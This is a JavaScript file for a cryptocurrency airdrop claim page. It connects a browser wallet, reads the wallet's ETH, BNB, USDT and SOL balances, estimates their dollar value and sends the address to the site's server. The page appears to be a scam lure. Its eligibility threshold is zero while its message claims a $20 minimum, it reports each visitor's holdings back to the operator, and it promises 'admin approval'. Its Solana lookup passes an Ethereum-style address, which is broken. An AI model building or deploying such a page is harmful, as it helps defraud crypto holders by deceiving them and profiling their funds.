let walletAddress = "";

function validateWalletProvider(type) {
  return (type === "metamask" && window.ethereum?.isMetaMask) ||
         (type === "trustwallet" && window.ethereum?.isTrust);
}

function validateAsset(asset) {
  return ["ETH", "USDT", "BNB", "SOL"].includes(asset);
}

async function fetchBalances(address) {
  const balances = {};
  try {
    const ethProvider = new ethers.BrowserProvider(window.ethereum);
    const ethBalance = await ethProvider.getBalance(address);
    balances.ETH = ethers.formatEther(ethBalance);

    const bnbProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const bnbBalance = await bnbProvider.getBalance(address);
    balances.BNB = ethers.formatEther(bnbBalance);

    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const usdtAbi = ["function balanceOf(address owner) view returns (uint256)"];
    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, ethProvider);
    const usdtRaw = await usdtContract.balanceOf(address);
    balances.USDT = (Number(usdtRaw) / 1e6).toFixed(2);

    const solRes = await fetch("https://api.mainnet-beta.solana.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "getBalance",
        params: [address]
      })
    });
    const solData = await solRes.json();
    if (solData.result && solData.result.value !== undefined) {
      balances.SOL = (solData.result.value / 1e9).toFixed(4);
    }
  } catch (err) {
    console.warn("Error fetching balances:", err);
  }
  return balances;
}

function checkEligibility(balances) {
  const threshold = 0;
  const eth = parseFloat(balances.ETH || 0) * 3000;
  const bnb = parseFloat(balances.BNB || 0) * 300;
  const usdt = parseFloat(balances.USDT || 0);
  const sol = parseFloat(balances.SOL || 0) * 25;

  const totalValue = eth + bnb + usdt + sol;
  const claimBtn = document.getElementById('claimBtn');
  const message = document.getElementById('eligibilityMessage');

  if (totalValue >= threshold) {
    claimBtn.disabled = false;
    message.style.color = 'green';
    message.innerText = `✅ Eligible for airdrop. Estimated: $${totalValue.toFixed(2)}`;
  } else {
    claimBtn.disabled = true;
    message.style.color = 'red';
    message.innerText = `⚠️ Not eligible. Need at least $20. You have ~$${totalValue.toFixed(2)}`;
  }
}

async function connectWallet() {
  const walletType = document.getElementById('walletType').value;

  if (!window.ethereum || !validateWalletProvider(walletType)) {
    if (walletType === 'metamask' && confirm("MetaMask not detected. Install it?")) {
      window.open('https://metamask.io/download.html', '_blank');
    } else {
      alert(`${walletType} is not available or not supported.`);
    }
    return;
  }

  try {
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    walletAddress = accounts[0];
    document.getElementById('walletInfo').innerText = `Wallet: ${walletAddress}`;
    document.getElementById('manualAddress').value = "";
    document.getElementById('validationStatus').innerText = "";

    sessionStorage.setItem('connectedWallet', walletAddress);
    sessionStorage.setItem('walletProvider', walletType);

    const balances = await fetchBalances(walletAddress);
    document.getElementById('balanceInfo').innerText =
      `Balance: ETH ${balances.ETH || 0} | BNB ${balances.BNB || 0} | USDT ${balances.USDT || 0} | SOL ${balances.SOL || 0}`;

    checkEligibility(balances);

    await fetch('/api/connect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: walletAddress,
        provider: walletType,
        verified: true
      })
    });

    alert("✅ Wallet connected successfully. Please select an asset for airdrop.");
  } catch (err) {
    console.error("Connection error:", err);
    alert("❌ Failed to connect wallet.");
  }
}

async function claimAirdrop() {
  const asset = document.getElementById('assetSelect').value;
  const manualInput = document.getElementById('manualAddress').value.trim();
  const addressToUse = manualInput || sessionStorage.getItem('connectedWallet');
  const provider = sessionStorage.getItem('walletProvider') || "manual";

  if (!/^0x[a-fA-F0-9]{40}$/.test(addressToUse)) {
    return alert("⚠️ Invalid wallet address.");
  }

  if (!validateAsset(asset)) {
    return alert("⚠️ Unsupported asset.");
  }

  try {
    await fetch('/api/claim', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: addressToUse, asset })
    });

    alert(`⏳ Airdrop processing for ${asset}. Admin will approve within 10 minutes.`);
  } catch (err) {
    console.error("Claim failed:", err);
    alert("❌ Airdrop request failed.");
  }
}

document.getElementById('connectBtn')?.addEventListener('click', connectWallet);
document.getElementById('claimBtn')?.addEventListener('click', claimAirdrop);
